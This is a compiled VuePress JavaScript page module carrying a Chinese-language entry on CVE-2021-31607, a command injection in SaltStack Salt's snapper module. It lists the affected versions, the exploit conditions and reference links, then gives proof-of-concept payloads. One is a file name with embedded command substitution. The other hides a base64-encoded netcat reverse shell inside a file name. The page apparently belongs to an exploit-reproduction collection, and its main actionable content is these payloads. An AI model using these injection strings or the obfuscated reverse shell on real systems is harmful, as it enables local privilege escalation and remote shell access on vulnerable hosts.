import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o as s,c as r,a as e,b as t,d as n,e as o}from"./app-58e4a7d6.js";const c={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),h=e("p",null,"2021年4月28日，深信服安全团队监测到一则Salt组件存在 SaltStack Minion 命令注入漏洞的信息，漏洞编号：CVE-2021-31607，漏洞威胁等级：中危。",-1),_=e("p",null,"该漏洞是由于在SaltStack Salt 2016.9至3002.6中，快照程序模块中存在一个命令注入漏洞，攻击者可利用该漏洞获得权限的情况下，对一个分支系统的本地特权进行升级。",-1),p=e("p",null,"参考阅读：",-1),u={href:"https://sec.stealthcopter.com/saltstack-snapper-minion-privledge-escaltion/",target:"_blank",rel:"noopener noreferrer"},v={href:"https://nvd.nist.gov/vuln/detail/CVE-2021-31607",target:"_blank",rel:"noopener noreferrer"},m={href:"https://nox.qianxin.com/vulnerability/detail/97347",target:"_blank",rel:"noopener noreferrer"},x=o(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>2016.9 ≤ SaltStack Salt ≤ 3002.6
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>利用条件 :</p><ol><li>用户认证：需要用户认证</li><li>前置条件：配置了快照程序，使用snapper模块</li><li>触发方式：本地</li></ol><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>echo hi &gt; &#39;$(touch HACKED).txt&#39;
反弹shell：
echo hi &gt; &#39;$(echo bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NDQ0|base64 -d|sh -i).txt&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,7);function b(g,f){const a=l("ExternalLinkIcon");return s(),r("div",null,[d,h,_,p,e("ul",null,[e("li",null,[e("a",u,[t("https://sec.stealthcopter.com/saltstack-snapper-minion-privledge-escaltion/"),n(a)])]),e("li",null,[e("a",v,[t("https://nvd.nist.gov/vuln/detail/CVE-2021-31607"),n(a)])]),e("li",null,[e("a",m,[t("https://nox.qianxin.com/vulnerability/detail/97347"),n(a)])])]),x])}const E=i(c,[["render",b],["__file","SaltStack Minion 命令注入漏洞 CVE-2021-31607.html.vue"]]);export{E as default};
